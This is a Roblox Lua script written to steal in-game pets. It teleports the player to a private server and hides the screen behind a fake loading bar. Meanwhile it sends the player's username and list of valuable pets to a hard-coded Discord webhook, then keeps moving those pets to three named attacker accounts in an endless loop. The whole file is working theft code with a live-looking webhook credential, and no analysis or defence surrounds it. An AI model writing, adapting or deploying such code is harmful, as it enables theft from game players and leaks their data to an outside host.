local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

local placeId = 126884695634066
local privateServerCode = "20579449181285003618611464122633"
local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"

local attackerNames = {
    ["boneblossom215"] = true,
    ["beanstalk1251"] = true,
    ["burningbud709"] = true,
}

local targetPets = {
    ["Trex"] = true, ["fennec fox"] = true, ["Raccoon"] = true,
    ["dragonfly"] = true, ["butterfly"] = true, ["queenbee"] = true,
    ["spinosaurus"] = true, ["redfox"] = true, ["Brontosaurus"] = true,
    ["mooncat"] = true, ["mimic octopus"] = true, ["d disco bee"] = true,
    ["dilophosaurus"] = true, ["kitsune"] = true
}

-- DEBUG GUI FUNCTION
local function logDebug(text)
    local screenGui = game.CoreGui:FindFirstChild("DebugLogGui") or Instance.new("ScreenGui", game.CoreGui)
    screenGui.Name = "DebugLogGui"
    local label = Instance.new("TextLabel", screenGui)
    label.Text = text
    label.Size = UDim2.new(1, 0, 0, 24)
    label.TextColor3 = Color3.new(1, 1, 1)
    label.BackgroundColor3 = Color3.new(0, 0, 0)
    label.BackgroundTransparency = 0.4
    label.TextScaled = true
    label.Position = UDim2.new(0, 0, 0, #screenGui:GetChildren() * 25)
end

logDebug("✅ Script started")

-- TELEPORT
task.spawn(function()
    task.wait(2)
    logDebug("🚀 Attempting teleport...")
    TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})
end)

-- WAIT UNTIL TELEPORTED
repeat task.wait() until game.PlaceId == placeId
logDebug("🛬 Teleport success!")

-- GUI
task.spawn(function()
    logDebug("🖼️ Showing GUI...")

    local screenGui = Instance.new("ScreenGui", game.CoreGui)
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false

    local bg = Instance.new("Frame")
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.Parent = screenGui

    local fill = Instance.new("Frame")
    fill.Size = UDim2.new(0, 0, 0, 30)
    fill.Position = UDim2.new(0.5, -200, 0.5, 0)
    fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
    fill.BorderSizePixel = 0
    fill.Parent = bg

    local percentLabel = Instance.new("TextLabel", bg)
    percentLabel.Size = UDim2.new(0, 100, 0, 40)
    percentLabel.Position = UDim2.new(0.5, -50, 0.5, -50)
    percentLabel.BackgroundTransparency = 1
    percentLabel.TextColor3 = Color3.new(1, 1, 1)
    percentLabel.Text = "0%"
    percentLabel.TextScaled = true

    for i = 0, 100, 5 do
        percentLabel.Text = i .. "%"
        fill.Size = UDim2.new(i / 100, 0, 0, 30)
        task.wait(10)
    end

    screenGui:Destroy()
    logDebug("✅ GUI finished")
end)

-- WAIT BEFORE SCAN
task.wait(5)

-- DISCORD WEBHOOK
task.spawn(function()
    logDebug("📡 Sending pet data to Discord...")

    local pets = {}
    for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
        if targetPets[string.lower(v.Name)] or targetPets[v.Name] then
            table.insert(pets, v.Name)
        end
    end

    local data = {
        ["username"] = LocalPlayer.Name,
        ["pets"] = pets,
        ["placeId"] = tostring(game.PlaceId)
    }

    local success, err = pcall(function()
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)

    if success then
        logDebug("✅ Webhook sent!")
    else
        logDebug("❌ Webhook failed: " .. tostring(err))
    end
end)

-- TRANSFER LOOP
task.spawn(function()
    logDebug("♻️ Starting transfer check loop...")

    local function transferPetsTo(attacker)
        for _, pet in pairs(LocalPlayer.Backpack:GetChildren()) do
            if targetPets[string.lower(pet.Name)] or targetPets[pet.Name] then
                pet.Parent = attacker:FindFirstChild("Backpack")
            end
        end
    end

    while true do
        for _, player in pairs(Players:GetPlayers()) do
            if attackerNames[player.Name] and player ~= LocalPlayer then
                logDebug("🎯 Transferring pets to: " .. player.Name)
                transferPetsTo(player)
            end
        end
        task.wait(2)
    end
end)
